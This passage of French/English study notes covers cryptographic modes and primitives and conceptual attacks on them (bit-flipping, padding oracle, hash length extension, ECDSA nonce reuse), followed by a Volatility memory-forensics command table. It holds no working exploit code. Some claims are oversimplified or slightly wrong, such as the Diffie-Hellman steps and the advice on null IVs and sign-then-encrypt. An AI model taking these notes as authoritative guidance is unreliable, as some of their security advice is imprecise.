<li><strong>Le chiffre de Vigenère est un système de chiffrement par substitution polyalphabétique mais une même lettre du message clair peut, suivant sa position dans celui-ci, être remplacée par des lettres différentes, contrairement à un système de chiffrement mono alphabétique comme le chiffre de César.</strong>
</li>
</ul>
<ul>

<li>Bit-flipping attack
<p>

            <strong>A bit-flipping attack is an attack on a cryptographic cipher in which the attacker can change the ciphertext in such a way as to result in a predictable change of the plaintext, although the attacker is not able to learn the plaintext itself.</strong>
</p>
<p>

            <strong>The attack is especially dangerous when the attacker knows the format of the message.</strong>
</p>
</li>
</ul>
<p>

            <strong>Example On CBC:</strong>
</p>
<p>

<img src="images/image290.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

            <strong>CBC chiffrement : XOR then ALGO</strong>
</p>
<p>

            <strong>CBC déchiffrement : ALGO then XOR</strong>
</p>
<p>

        <strong>It’s also dangerous when the attacker has access to the IV.</strong>
</p>
<ul>

<li>CBC-MAC :
<p>

    <strong>CBC-MAC is a method to ensure integrity of a message by encrypting it using CBC mode and keeping the last encrypted block as "signature". </strong>
</p>
<p>

    <strong>This ensures that a malicious user can not modify any part of the data without having to change the signature. The key used for the "encryption" ensures that the signature can't be guessed.</strong>
</p>
<p>

    
<img src="images/image291.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
<p>
<strong>			              CBC-MAC signature construction</strong>
</p>
<p>
<strong>	It’s recommended to choose an IV as NULL ( “00000000” ).</strong>
</p>
<p>
<strong>	</strong>
<img src="images/image292.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>	Using CBC-MAC without some restrictions can break the security of the </strong>
</p>
<p>
<strong>implementation :</strong>
</p>
<p>

        <strong>Example with username of 2 block :</strong>
</p>
<p>

        
<img src="images/image293.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>


<img src="images/image294.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

        
<img src="images/image295.png" width="" alt="alt_text" title="image_tooltip">

</p>  
<ul>
  
<li>Mode opératoire CTR :
</li>  
</ul>
<p>

<img src="images/image296.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Formule chiffrement : C[n] = Enc( key, NONCE||counter) ^ M[n] 

<li>Formule déchiffrement : M[n] = Enc( key, NONCE||counter) ^ C[n] 
<ul>
 
<li>Enc = AES, …
 
<li>NONCE => 64 bits et  counter => 64 bits pour des blocs de 128 bits
 
<li>counter = 1,2,3 …..
 
<li>à chaque nouveau chiffrement, la nonce doit être réinitialisé ( avec une autre valeur random )
</li> 
</ul>
</li> 
</ul>
<ul>

<li>Mode opératoire ECB :
</li>
</ul>
<p>

<img src="images/image297.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Diffie-Hellman
</li>
</ul>
<h4>			intro :</h4>


<p>
<strong>			l'échange de clés Diffie-Hellman, du nom de ses auteurs</strong>
</p>
<p>

        <strong>Whitfield Diffie et Martin Hellman, est une méthode, </strong>
</p>
<p>

            <strong>publiée en 1976, par laquelle deux personnes peuvent se mettre d'accord sur un nombre (qu'ils peuvent utiliser comme clé pour chiffrer la conversation suivante) sans qu'une troisième personne puisse découvrir le nombre, même en ayant écouté tous leurs échanges ( sans rien modifier ). </strong>
</p>
<p>

            <strong>Cette idée valut en 2015 aux deux auteurs le prix Turing.</strong>
</p>
<p>

    
<img src="images/image298.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Fonctionnement de Diffie-Hellman :
</li>
</ul>
<ol>

<li><strong>Alice et Bob ont choisi un nombre premier p fini et une base g plus petit strictement que p (nombre pouvant être connu de tous).</strong>
<ol>

<li><strong>Alice choisit un nombre au hasard a et initie un autre nombre A =  g^a [modulo p]. Elle envoie A à Bob.</strong>
<ol>

<li><strong>Bob choisit un nombre au hasard b et initie un autre nombre B =  g^b [modulo p]. Il envoie B à Bob. </strong>
<ol>

<li><strong>Alice, en calculant B^a ( B reçu de Bob ), obtient g^ba [modulo p] = Secret.</strong>
<ol>

<li><strong>Bob, en calculant A^b ( A reçu de Bob ), obtient g^ab [modulo p] = Secret.</strong>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<ul>

<li><strong>Il est difficile d'inverser l'exponentiation dans un corps fini (ou sur une courbe elliptique quand elle est utilisée), c’est-à-dire de calculer le logarithme discret: </strong>
</li>
</ul>
<ul>

<li><strong>Dans la description ci-dessus, Alice et Bob travaillent dans le corps fini Z/pZ, ils échangeront les nombres modulo p. </strong>
<p>

                <strong>De manière générale, l'échange de clés Diffie-Hellman se généralise à un groupe fini cyclique quelconque (au lieu de se mettre d'accord sur un nombre premier p, ils se mettent d'accord sur un groupe fini). </strong>
</p>
<p>

                <strong>Ce groupe fini peut être un corps fini dont ils n'utilisent que la multiplication, ou une courbe elliptique.</strong>
</p>
<p>

                <strong>équation courbe elliptique : </strong>
<img src="images/image299.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

                <strong>( le 2eme x n’est pas au carré )</strong>
</p>
</li>
</ul>
<h4>				   DH avec courbe elliptique : </h4>


<p>

<img src="images/image300.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image301.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Dans E(a,b,K), K est un corps fini auquel appartient x et y.</strong>
</li>
</ul>
<ul>

<li><strong>Transmission de message avec un algo. de chiffrement par courbe elliptique:</strong> 
<ul>
 
<li><strong>Alice veut envoyer à Bob un message.</strong> 
<ul>
 
<li><strong>Bob commence par fabriquer une clé publique de la façon suivante: il choisit une courbe elliptique E(a,b,K), un point P de la courbe, et un entier kB.</strong>
<p>

        <strong>Sa clé publique est constituée par la courbe elliptique E(a,b,K) et par les points P et kB*P de cette courbe elliptique.</strong>
</p>
<p>

        <strong>Sa clé privée est l'entier kB.</strong>
</p>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<p>

<img src="images/image302.png" width="" alt="alt_text" title="image_tooltip">

</p> 
<ul>
 
<li><strong>Nous avons passé sous silence une difficulté majeure : si on veut s'échanger un texte, il faut pouvoir le transformer en une suite de points de la courbe elliptique. Ceci est loin d'être trivial, car il n'est pas toujours facile de trouver des points sur une courbe elliptique.</strong> 
<ul>
 
<li><strong>Comme les calculs sur les courbes elliptiques ne sont pas bien compliqués à réaliser, c'est un gros avantage pour les cartes à puces où on dispose de peu de puissance, et où la taille de la clé influe beaucoup sur les performances.</strong>
</li> 
</ul>
</li> 
</ul> 
<ul>
 
<li><strong>Ce qui fait la différence des algorithmes de chiffrement à base de courbes elliptiques par rapport aux algorithmes basés sur les entiers comme RSA ou El-Gamal est que, pour les vaincre, il faut résoudre le logarithme discret sur le groupe de la courbe elliptique, et non un problème analogue sur les entiers.</strong>
</li> 
</ul>
<p>

        <strong>C'est pourquoi on estime qu'une clé de 200 bits (qui mesure, pour une courbe elliptique, la taille du corps fini K de cette courbe) pour les chiffres basés sur les courbes elliptiques est plus sûre qu'une clé de 1024 bits pour le RSA.</strong>
</p> 
<ul>
 
<li><strong>Les inconvénients sont de deux ordres. D'une part, la théorie des fonctions elliptiques est complexe, et encore relativement récente. Il n'est pas exclu que des trappes permettent de contourner le problème du logarithme discret. </strong>
<p>

        <strong>D'autre part, la technologie de cryptographie par courbe elliptique a fait l'objet du dépôt de nombreux brevets à travers le monde. Cela peut rendre son utilisation très coûteuse !</strong>
</p>
<p>

        
<img src="images/image303.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li> 
</ul>
<ul>

<li><strong>Ce protocole ( DH ) est vulnérable à « l'<a href="https://fr.wikipedia.org/wiki/Attaque_de_l%27homme_du_milieu">attaque de l'homme du milieu</a> » ( exemple sans C.Elliptique ): </strong> 
<ul>
 
<li><strong>Un attaquant peut se placer entre Alice et Bob, intercepter la clé g^a envoyée par Alice et envoyer à Bob une autre clé g^a', se faisant passer pour Alice. </strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>De même, il peut remplacer la clé g^b envoyée par Bob à Alice par une clé g^b', se faisant passer pour Bob.</strong>
<ul>

<li><strong>L'attaquant communique ainsi avec Alice en utilisant la clé partagée g^ab' et communique avec Bob en utilisant la clé partagée g^a'b, Alice et Bob croient communiquer directement.</strong>
<p>

        <strong>La parade classique à cette attaque consiste à signer les échanges de valeurs à l'aide d'une paire de clés asymétriques certifiées.</strong>
</p>
<ul>

<li>AES ( Advanced Encryption Standard )
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>AES is at least six times faster than triple DES. </strong>
<p>

    <strong>A replacement for DES was needed as its key size was too small. With increasing computing power, it was considered vulnerable against exhaustive key search attack. Triple DES was designed to overcome this drawback but it was found slow.</strong>
</p>
</li>
</ul>
<ul>

<li><strong>Longueur des blocs : 128 bits en général( 16 bytes ) ou 64 bits</strong>
<p>

    <strong>longueur de la clé : 128/192/256-bit</strong>
</p>
</li>
</ul>
<p>
<strong>The schematic of AES structure</strong>
</p>
<p>

<img src="images/image304.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Each round comprises four sub-processes. The first round process is depicted below :</strong>
</li>
</ul>
<p>

<img src="images/image305.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image306.gif" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Byte Substitution (SubBytes)</strong>
</li>
</ul>
<p>
<strong>The 16 input bytes are substituted by looking up a fixed table (S-box) given in</strong>
</p>
<p>
<strong>design. The result is in a matrix of four rows and four columns.</strong>
</p>
<ul>

<li><strong>Shiftrows</strong>
</li>
</ul>
<p>
<strong>Each of the four rows of the matrix is shifted to the left. Any entries that ‘fall off’ are re-inserted on the right side of the row.</strong>
</p>
<ul>

<li><strong>MixColumns</strong>
</li>
</ul>
<p>
<strong>Each column of four bytes is now transformed using a special mathematical function. This function takes as input the four bytes of one column and outputs four completely new bytes, which replace the original column. The result is another new matrix consisting of 16 new bytes. It should be noted that this step is not performed in the last round.</strong>
</p>
<ul>

<li><strong>Addroundkey</strong>
</li>
</ul>
<p>
<strong>The 16 bytes of the matrix are now considered as 128 bits and are XORed to the 128 bits of the round key. If this is the last round then the output is the ciphertext. Otherwise, the resulting 128 bits are interpreted as 16 bytes and we begin another similar round.</strong>
</p>
<ul>

<li><strong>Les clés de l'AES font 128,192 ou 256 bits. Chacune correspondant à un nombre de répétition du chiffrement.</strong>
<p>

    <strong>Ces clés sont étendues ( key schedule ). D'autres clés sont créées à partir de la clé initiale ( pour chaque tours ). </strong>Finalement,<strong> c’est comme si “une grande clef” qui est utilisée.</strong>
</p>
<p>

    <strong>                      Extension d’une clef 128 bits</strong>
</p>
</li>
</ul>
<p>

<img src="images/image307.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

    <strong>Avec Wi = la colonne i (4 octets) de la clef représentée par une matrice.</strong>
</p>
<ul>

<li><strong>g(): une fonction linéaire spéciale définie.</strong>
</li>
</ul>
<ul>

<li><strong>Now, for AES256, the first two round keys are, in fact, 256 bits taken directly from the AES key. After that, it computed the next round key based on a simple function of the previous two round keys (plus a per round constant)</strong>
</li>
</ul>
<ul>

<li><strong>The process of decryption of an AES ciphertext is similar to the encryption process in the reverse order. </strong>
</li>
</ul>
<ul>

<li><strong>There are no known "efficient" attacks on full AES. This means that if you want to break the 10 rounds of AES-128, you will probably have to do a brute-force attack (or something close to that).</strong>
</li>
</ul>
<ul>

<li><strong>If we use less than 10-round, it’s dangerous. </strong>
</li>
</ul>
<p>
<strong>-----------------------------------------------------------------------</strong>
</p>
<ul>

<li>PKCS#5 and PKCS#7 padding :
<p>

    
<img src="images/image308.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

        <strong>If the length of the original data is an integer multiple of the block size B, then an extra block of bytes with value B ( size of one block ) is added.</strong>
</p>
</li>
</ul>
<ul>

<li><strong>The difference between the PKCS#5 and PKCS#7 padding mechanisms is the block size; PKCS#5 padding is defined for 8-byte block sizes, PKCS#7 padding would work for any block size from 1 to 255 bytes.</strong>
</li>
</ul>
<p>
<strong>		So fundamentally PKCS#5 padding is a subset of PKCS#7 padding</strong>
</p>
<p>

    <strong>for 8 byte block sizes.</strong>
</p>
<ul>

<li>Perfect Forward Secrecy ( PFS ): 
<p>

        <strong>La propriété de forward secrecy permet à une information chiffrée aujourd’hui de rester confidentielle en cas de compromission future de la clef privée d’un correspondant ( en utilisant l'aspect “Éphémère” dans TLS par exemple ).</strong>
</p>
<p>

        <strong>À noter que l'implémentation de cette propriété coûte une partie dans le temps de calcul.</strong>
</p>
</li>
</ul>
<h3>              Hash length attack extension</h3>


<p>

<img src="images/image309.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image310.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

        <strong>Algorithms like MD5, SHA-1, and SHA-2 that are based on the Merkle–Damgård construction are susceptible to this kind of attack.The SHA-3 algorithm is not susceptible.</strong>
</p>
<p>

        <strong><a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks</a></strong>
</p>
<h3>Liste d’Algo de générateur de nombres pseudo-aléatoires</h3>



<table>
  <tr>
   <td><strong> Mersenne Twister </strong>
   </td>
   <td><strong>L’algorithme est basé sur un TGSFR (twisted generalised shift feedback register, un type particulier de registre à décalage à rétroaction).</strong>
<p>
<strong>Sa période est de 2^19937 − 1.</strong>
<p>
<strong>Si on a les éléments d’une suite, les éléments suivants sont prédictibles avec cette algo.</strong>
   </td>
  </tr>
  <tr>
   <td><strong> Berlekamp-Massey</strong>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td><strong> Reed-Sloane</strong>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>

    <strong>In computer security, a side-channel attack is any attack based on information gained from the implementation of a computer system, rather than weaknesses in the implemented algorithm itself (e.g. cryptanalysis and software bugs). Timing information, power consumption, electromagnetic leaks or even sound can provide an extra source of information, which can be exploited.</strong>
</p>
<ul>

<li>ECDSA ("Elliptic Curve Digital Signature Algorithm")
</li>
</ul>
<ul>

<li><strong>Les avantages de ECDSA sur DSA et RSA sont des longueurs de clés plus courtes et des opérations de signature et de chiffrement plus rapides.</strong>
</li>
</ul>
<ul>

<li><strong>ECDSA est l’algorithme de signature électronique à clé publique utilisé par Bitcoin.</strong>
</li>
</ul>
<p>
<strong>Génération des clés pub/priv :</strong>
</p>
<p>

<img src="images/image311.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image312.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image313.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>k is named a nonce here.</strong>
</p>
<p>
<strong>En effet, le fait que le logarithme discret ( sur courbe elliptique ) soit un problème difficile nous assure qu’un attaquant ne pourra pas retrouver la clé privé de Bob en un temps raisonnable</strong>
</p>
<p>

<img src="images/image314.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Attack on ECDSA :</strong>
</p>
<ul>

<li><strong>Recovering secret keys from reused nonces :</strong> 
<ul>
 
<li><strong>if a signer ever releases a signature and also releases the nonce they used, an attacker can immediately recover the secret key.</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>Even if the signer keeps every nonce secret, if they accidentally repeat a single nonce (even for different messages), the secret key can immediately be recovered as well.</strong>
</li>
</ul>
<h3>Algorithme RC4 :</h3>


<p>
<strong>		</strong>
</p>
<p>
<strong>RC4 est un algorithme de chiffrement par flux (par flot ou encore sans état) à clésymétrique développé en 1987 par Ronald Rivest (l’un des créateurs du RSA). C’est un générateur de bits pseudo-aléatoires dont le résultat est combiné avec le texte en clair via une opération XOR.</strong>
</p>
<p>
<strong>Son nom signifie : Ron’s Code #4 ou encore Rivest Cipher #4. </strong>
</p>
<p>
<strong>Il utilise différentes tailles de clé, couramment jusqu’à 256 bits.</strong>
</p>
<p>
<strong>RC4 ne nécessite pas trop de puissance de calcul. Il est extrêmement rapide (environ 10x plus rapide que le DES).</strong>
</p>
<p>
<strong>Cet algorithme reprend le principe du masque jetable (OTP – One Time Pad ou masque de Vernam). En effet, on génère un flux de données de taille identique au flux de données claires et on fait un XOR entre les deux, le déchiffrement se fait par XOR entre le chiffré et le même flux pseudo-aléatoire.</strong>
</p>
<p>
<strong>			</strong>
</p>
<h3>				EDDSA</h3>


<ul>

<li><strong>EdDSA (anglais : Edwards-curve Digital Signature Algorithm (algorithme de signature numérique Courbe d'Edwards), à ne pas confondre avec ecDSA), est, dans le domaine de la cryptographie asymétrique, un schéma de signature numérique utilisant une variante de la cryptographie sur les courbes elliptiques basée sur les courbes d'Edwards tordues. Il a été conçu pour fournir de bonnes performances tout en évitant les problèmes de sécurité qui sont apparus dans les autres schémas de signatures électroniques.</strong>
</li>
</ul>
<h3>				DES</h3>


<ul>

<li><strong>The Data Encryption Standard (DES) is an algorithm that was adopted as an official standard in 1977 in the US. The original proposal was modified slightly to strengthen against differential cryptanalysis, but also significantly weakened against brute-force attacks, particularly as a result of the reduction of key size to 56 bits. With enough horsepower, it was only a matter of time before a key-search machine, capable of rapidly computing every possible key, in turn, was able to break DES. DES supports 8-byte keys.</strong>
</li>
</ul>
<h3>           An Initialization Vector (IV)</h3>


<p>
<strong>-In cryptography, an Initialization Vector (IV) is a nonce used to randomize the encryption, so that even if multiple messages with identical plaintext are encrypted, the generated corresponding ciphertexts will each be distinct.</strong>
</p>
<p>
<strong>Unlike the Key, the IV usually does not need to be secret, rather it is important that it is random and unique. In fact, in certain encryption schemes the IV is exchanged in public as part of the ciphertext.</strong>
</p>
<p>
<strong>Reusing the same Initialization Vector with the same Key to encrypt multiple plaintext blocks allows an attacker to compare the ciphertexts and then, with some assumptions on the content of the messages, to gain important information about the data being encrypted.</strong>
</p>
<p>
<strong>The consequences of reusing the same IV-Key pair depend on the actual cipher and mode used :</strong>
</p>

<table>
  <tr>
   <td><strong>CBC,CFB</strong>
   </td>
   <td><strong>The leaks of information from the first block and commonalities are enough to lead an empowered attacker to fully compromising the encryption layer of protection in the given system</strong>
   </td>
  </tr>
  <tr>
   <td><strong>OFB,CTR,GCM</strong>
   </td>
   <td><strong>IV reuse renders encryption practically useless as given two ciphertexts their XOR yields the same result of XOR-ing the two corresponding plaintexts.</strong>
<p>
<strong>Cypher1 ^ Cypher2 = Clair1 ^ Clair2</strong>
   </td>
  </tr>
</table>


<p>

<img src="images/image315.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Padding oracle attacks :

<li>Définition :
<p>

    <strong>Padding Oracle Attacks arise due to a vulnerability in the decryption validation process of Cipher-Block Chaining (CBC) encrypted messages (published back in 2002).</strong>
</p>
<p>

    <strong>However, given a significant percentage of web clients still support unsafe cipher modes, the technique, as well as adaptations of and extensions to the original methodology, persist (found close to 100 TLS Padding Oracle Attack variations in the wild in just 2019 alone). </strong>
</p>
<p>

    <strong>In the case of Padding Oracle Attacks, a malicious actor exploits the verifiable padding data at the end of the block by continually sending specially crafted messages against the cipher and relying on the error messages returned to determine the correctness of the messages.</strong>
</p>
<p>

    
<img src="images/image316.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

    
<img src="images/image317.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
<p>
<strong>A padding oracle is present if an application leaks this specific padding </strong>
</p>
<p>
<strong>error condition for encrypted data provided by the client.</strong>
</p>
<p>
<strong>Knowing whether or not a given ciphertext produces plaintext with valid </strong>
</p>
<p>
<strong>padding is ALL that an attacker needs.</strong>
</p>
<p>
<strong>The reason it works in CBC mode is that we can make predictable,</strong>
</p>
<p>
<strong>arbitrary changes to the plaintext of the last block by modifying the</strong>
</p>
<p>
<strong>ciphertext (of the second to last block, or the IV). For another mode</strong>
</p>
<p>
<strong>to be vulnerable, the same kind of control would be needed.</strong>
</p>
<h4>	Prévention </h4>


<ul>

<li><strong>Make sure that an Oracle doesn’t exist.</strong>

<li><strong>Verify that known insecure block modes (i.e. ECB, etc.) and padding modes (i.e. PKCS#1 v1.5, etc.) are not used. Verify that all cryptographic modules fail securely, and errors are handled in a way that does not enable Padding Oracle attacks.</strong>
<p>

    
<img src="images/image318.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>GCM ( Galois Counter Mode )
<ul>

<li><strong>GCM ( Galois Counter Mode ) includes an authentication mechanism.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>
<strong>Galois/Counter Mode (GCM) est un mode d'opération de chiffrement par bloc en cryptographie symétrique. Il est relativement répandu en raison de son efficacité et de ses performances.</strong>
</p>
<p>
<strong>C'est un algorithme de chiffrement authentifié conçu pour fournir à la fois l'intégrité et l'authenticité des données, ainsi que la confidentialité.</strong>
</p>
<p>
<strong>GCM est défini pour les chiffrements par bloc avec des tailles de bloc de 128 bits.</strong>
</p>
<p>

<img src="images/image319.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Le Salt
<p>

    - <strong>Le salage, est une méthode permettant de renforcer la sécurité des informations qui sont destinées à être hachées (par exemple des mots de passe) en y ajoutant une donnée supplémentaire afin d’empêcher que deux informations identiques conduisent à la même empreinte (la résultante d’une fonction de hachage). </strong>
</p>
<p>

    <strong>Le but du salage est de lutter contre les attaques par analyse fréquentielle, les attaques utilisant des rainbow tables</strong>.<strong> Pour ces deux dernières attaques, le salage est efficace quand le sel utilisé n’est pas connu de l’attaquant ou lorsque l’attaque vise un nombre important de données hachées toutes salées différemment.</strong>
</p>
<p>

    Le salt est généralement une donnée publique. Il ne prévient pas lui-même des attaques de type bruteforce. c’est une valeur unique stockée généralement avec le hash
</p>
<p>

    Un salt non public peut être appelé un “Pepper”. Lui peut prévenir des attaques de type brute force utilisant des wordlists classiques.
</p>
</li>
</ul>
<h3>MISC</h3>


<ul>

<li>Si l'on chiffre en utilisant la clef privée alors on peut déchiffrer en utilisant la clef publique.
</li>
</ul>
<ul>

<li>Un HMAC ( <em>keyed-hash message authentication code )</em> est un type de code d'authentification de message (CAM), ou MAC en anglais (message authentication code), calculé en utilisant une fonction de hachage cryptographique en combinaison avec une clé secrète.
<p>

            Il peut être utilisé pour vérifier simultanément l'intégrité de données et l'authenticité d'un message.
</p>
</li>
</ul>
<p>

            La qualité cryptographique du HMAC dépend de la qualité cryptographique de la fonction de hachage et de la taille et la qualité de la clé.
</p>
<p>

            Formule d’un HMAC :
</p>
<p>

    
<img src="images/image320.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>"||" désigne une concaténation.

<li>ipad et opad, chacune de la taille d'un bloc, sont définies par : ipad = 0x363636...3636 et opad = 0x5c5c5c...5c5c.
<ul>

<li>Lorsque que l’on utilise le système de Signature Digitale ( Hash + signature avec la clef privé ), le Hash est la QUE pour réduire la taille des calculs  !
</li>
</ul>
</li>
</ul>
<ul>

<li>Dans un protocole cryptographique classique ( utilisation Symétrie/asymétrie/signature ) Il y a plusieurs choix dans l’ordre des calculs : 
<ul>
 
<li>Encrypt-then-sign
<p>

                        Envoyer :  c = algo_sym( m ) | s =  algo_asym( hash(c) )
</p> 
<ul>
 
<li>Encrypt-and-sign  
<ul>
  
<li>Envoyer : c = algo_sym(m) | s = algo_asym( hash(m) ) 
<ul>
 
<li>Sign-then-Encrypt  
<ul>
  
<li>Envoyer : algo_sym( m | s = algo_asym(hash(m)) )
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
<p>

                    Chacune des méthodes a ses avantages et inconvénients et cela peut causer des failles de sécurité importantes si on choisi l’un plutôt que l’autre. 
</p>
<p>

                    Mais de manière générale, le meilleur est Sign-then-Encrypt
</p>
<ul>

<li>En cryptanalyse, une attaque temporelle consiste à estimer et analyser le temps mis pour effectuer certaines opérations cryptographiques dans le but de découvrir des informations secrètes. La mise en œuvre de ce genre d'attaque est intimement liée au matériel ou au logiciel attaqué.
<ul>

<li>Modern cryptographic protocols often require frequent generation of random quantities. Cryptographic attacks that subvert or exploit weaknesses in this process are known as random number generator attacks.
</li>
</ul>
</li>
</ul>
<ul>

<li>Virtual HSM (VHSM) is a software suite for storing and manipulating secret data outside the virtualized application environment. While HSM is a physical device connected to the computer, this software provides HSM functionality through the PKCS#11 API in a virtual environment based on OpenVZ container technology.
<ol>

<li>Forensic
</li>
</ol>
</li>
</ul>
<h3>Some tools and command</h3>



<table>
  <tr>
   <td><strong>Dumpzilla</strong>
   </td>
   <td><strong>Available on Kali, this application is developed in Python 3.x and has as purpose extract all forensic interesting information of Firefox, Iceweasel and Seamonkey browsers to be analyzed.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Autopsy</strong>
   </td>
   <td><strong>Très intéressant et facile d’utilisation sur Windows pour analyser des dumps</strong>
   </td>
  </tr>
  <tr>
   <td><strong>pypykatz</strong>
   </td>
   <td><strong>analyse DMP file.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Process Hacker ( on Windows )</strong>
   </td>
   <td><strong>Allow you to see all processes running on your machine with some informations ( owner, description, command line ( file path ), … ) </strong>
   </td>
  </tr>
  <tr>
   <td><strong>oledump.py</strong>
   </td>
   <td><strong>oledump.py is a program to analyze OLE files.</strong>
<p>
<strong>Many applications use this file format, the best known is MS Office. .doc, .xls, .ppt, …</strong>
   </td>
  </tr>
  <tr>
   <td><strong>bulk-extrator [IMAGE_FILE] -o [OUTPUT_REPO]</strong>
   </td>
   <td><strong>bulk_extractor is a program that extracts features such as email addresses, credit card numbers, URLs, and other types of information from digital evidence files</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>Volatility
<ul>

<li><strong>Syntax Volatility command :</strong>
<p>

    
<img src="images/image321.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
</li>
</ul>
<p>
<strong>				  </strong>
</p>
<h4>Some Volatility command and plugin</h4>



<table>
  <tr>
   <td><strong>volatility -f [DUMP_FILE] imageinfo</strong>
   </td>
   <td>
<ul>

<li><strong>identify some OS profiles </strong>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td><strong>volatility -f ch2.dmp --profile=Win7SP1x86 hivelist</strong>
   </td>
   <td><strong>Dumper les Hives ( Windows )</strong>
<p>
<strong>--profile : Pour que Volat. interprète bien le fichier en entrée</strong>
   </td>
  </tr>
  <tr>
   <td><strong>volatility --info | more</strong>
   </td>
   <td><strong>You Can list all available plugins with this command ( adding a quick description of each one of them )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>volatility -f [DUMP_FILE] --profile=[PROFILE] kdgbscan</strong>
   </td>
   <td><strong>Provide more information than imageinfo but it’s more slow</strong>
   </td>
  </tr>
  <tr>
   <td><strong>volatility -f [DUMP_FILE] --profile=[PROFILE] pslist > file.txt</strong>
   </td>
   <td><strong>List all processes. psscan provide more information ( terminated,unlinked and hidden processus, … )</strong>
<p>
<strong>It worth to look if a process appear with psscan and not with pslist.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>pstree</strong>
   </td>
   <td><strong>To view the process listing in tree form, use the pstree command. This enumerates processes using the same technique as pslist.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>psxview</strong>
   </td>
   <td><strong>Aids in discovering hidden processes.</strong>
<p>
<strong>This plugin compares the active processes indicated within psActiveProcessHead ( associated with pslist ) with any other possible sources within the memory image</strong>
   </td>
  </tr>
  <tr>
   <td><strong>malfind</strong>
   </td>
   <td><strong>famous plugin that find hidden or injected code/DLLs in user mode memory</strong>
   </td>
  </tr>
  <tr>
   <td><strong>moddump</strong>
   </td>
   <td><strong>Extract Executables, drivers from kernel memory</strong>
   </td>
  </tr>
  <tr>
   <td><strong>DLLdump</strong>
   </td>
   <td><strong>Dumping DLLs from memory</strong>
   </td>
  </tr>
  <tr>
   <td><strong>netscan</strong>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>f<strong>socket </strong>
   </td>
   <td><strong>To detect listening sockets for any protocol (TCP, UDP, RAW, etc).</strong>
<p>
<strong>This command is for x86 and x64 Windows XP and Windows 2003 Server only.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>netscan</strong>
   </td>
   <td><strong>To scan for network artifacts in 32- and 64-bit Windows Vista, Windows 2008 Server and Windows 7.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>connscan</strong>
   </td>
   <td><strong>The connscan plugin is a scanner for TCP connections.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>consoles / cmdscan</strong>
   </td>
   <td><strong>which extracts command history by scanning for _CONSOLE_INFORMATION.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>procdump</strong>
   </td>
   <td><strong>-p : PID of the process</strong>
<p>
<strong>extract process.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>memdump</strong>
   </td>
   <td><strong>-p : PID of the process</strong>
<p>
<strong>extract process as a dump file. it represents the addressable memory of the process.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>filescan</strong>
   </td>
   <td><strong>scan for file inside the dump</strong>
   </td>
  </tr>
  <tr>
   <td><strong>dumpfiles</strong>
   </td>
   <td><strong>get file inside the dump</strong>
<p>
<strong>-D : destination directory </strong>
<p>
<strong>-Q : dump file physical address OFFSET</strong>
<p>
<strong>-n : output file name</strong>
   </td>
  </tr>
  <tr>
   <td><strong>foremost -v -i dump -o forefore</strong>
   </td>
   <td><strong>extract files from dump</strong>
   </td>
  </tr>
  <tr>
   <td><strong>clipboard</strong>
   </td>
